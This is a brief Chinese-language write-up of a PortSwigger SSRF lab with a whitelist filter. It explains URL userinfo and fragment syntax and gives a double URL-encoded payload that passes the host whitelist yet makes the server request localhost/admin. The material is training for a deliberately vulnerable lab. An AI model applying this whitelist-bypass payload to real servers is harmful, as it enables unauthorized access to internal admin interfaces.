# [靶场地址](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)

## 新知识
1. https://  alice:tea@catalog.example/books#part2
   - alice　用户名
   - :　分隔符
   - tea　密码
   - @　用户信息和主机名的分隔符
   - catalog.example　主机名
   - /books　资源路径
   - #part2　不会被当成http请求路径发送
---

### 进入靶场
1. 依旧排列组合昂...多踩坑也挺好
2. 本题构造:　http%3A%2F%2Flocalhost%2523@stock.weliketoshop.net/admin　　->　图1
   - 第一次解码之后是: http://localhost%23@stock.weliketoshop.net/admin  
       - 这时候后面那个@stock.weliketoshop.net依旧生效,通过校验
   - 第二次解码之后: http://localhost#@stock.weliketoshop.net/admin
       - #@stock.weliketoshop.net被注释掉
       - 相当于只访问了 http:/localhost/admin
       - [x] 完成绕过
3. 不再赘述　　->　图2
**solved**